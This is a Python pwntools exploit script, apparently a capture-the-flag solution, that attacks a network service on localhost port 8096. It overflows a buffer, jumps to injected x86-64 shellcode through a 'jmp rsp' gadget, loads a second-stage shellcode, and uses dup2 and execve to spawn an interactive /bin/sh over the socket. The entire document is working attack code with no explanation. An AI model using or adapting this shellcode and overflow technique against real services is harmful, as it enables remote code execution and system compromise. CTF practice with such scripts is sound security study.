from pwn import *
import time

p = remote('localhost',8096)


jmprsp = 0x000000000040186d

shellcode = '''
mov rdi, rax 
mov dil, 2
mov al, 32
syscall
dec eax
mov rdi, rax
mov r10, rdi
xor rax, rax
mov rdx, rax
mov rsi, rsp
sub rsi, 36
mov dl, 100
syscall
'''
shellcode = asm(shellcode, arch='amd64')
print len(shellcode)
shellcode1 = '\xeb\xd2'


shell = """
    mov r9, rsi
    xor rdx, rdx
top:
    xor rax, rax
    mov rdi, r10
    mov rsi, rdx
    mov al, 33
    syscall
    inc rdx
    cmp rdx, 3
    jne top

    mov rdi, r9
    xor rax, rax
    mov rdx, rax
    mov rsi, rax
    mov al, 59
    syscall

"""
shell = asm(shell, arch='amd64')


print shellcode.encode('hex')
p.sendline('done'+'\x90'*(36-len(shellcode))+shellcode+ p64(jmprsp) + shellcode1)
time.sleep(.1)

p.sendline('/bin/sh\x00'+'\x90'*42 + shell)




p.interactive()
